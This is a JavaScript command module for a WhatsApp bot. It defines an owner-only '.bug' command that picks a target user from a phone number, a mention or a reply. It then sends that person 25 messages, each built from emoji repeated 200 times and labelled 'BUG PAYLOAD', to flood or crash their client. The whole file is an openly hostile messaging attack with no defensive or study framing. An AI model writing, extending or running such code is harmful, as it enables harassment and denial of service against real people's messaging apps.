export default async function(sock, chatId, msg, isOwner, q) {
    if (!isOwner) return await sock.sendMessage(chatId, { text: '❌ Owner only!' }, { quoted: msg });
    
    try {
        let target;
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
        
        if (q) target = q.replace(/\D/g, '') + '@s.whatsapp.net';
        else if (mentioned) target = mentioned;
        else if (quoted) target = quoted;
        else return await sock.sendMessage(chatId, { text: '⚠️ .bug @user or reply to user' }, { quoted: msg });
        
        await sock.sendMessage(chatId, { text: `🪳 Sending bug to @${target.split('@')[0]}...`, mentions: [target] }, { quoted: msg });
        
        // Send bug-inducing messages
        const bugChars = [
            '😵', '😱', '🤖', '💀',
            '☠️', '👻', '👺', '🧟'
        ];
        
        for (let i = 0; i < 25; i++) {
            try {
                const text = bugChars.join('').repeat(200) + '\nBUG PAYLOAD #' + (i+1);
                await sock.sendMessage(target, { text });
            } catch (e) {}
        }
        
        await sock.sendMessage(chatId, { text: `🪳 Bug payload delivered!` }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(chatId, { text: '❌ Error: ' + e.message }, { quoted: msg });
    }
}